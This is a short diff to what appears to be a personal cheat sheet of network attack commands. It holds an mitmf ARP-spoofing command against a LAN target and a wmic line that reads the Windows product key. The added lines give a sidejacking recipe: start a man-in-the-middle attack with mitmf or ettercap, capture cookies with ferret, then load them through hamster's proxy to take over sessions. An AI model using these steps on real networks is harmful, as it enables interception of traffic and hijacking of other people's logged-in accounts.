@@ -1,3 +1,7 @@
 -Example usage of mitmf: sudo mitmf --arp --spoof --gateway 192.168.1.1 --target 192.168.1.10 -i wlan0
 
 -To get the windows product key execute with admin privileges: wmic path softwarelicensingservice get OA3xOriginalProductKey
+
+-Use mitmf or ettercap to start mitm then use ferret to capture cookies (ferret -i eth0)
+  use hamster to set session cookies and then in browser set the proxy settings to manual giving the address
+  provided by hamster and finally open that link
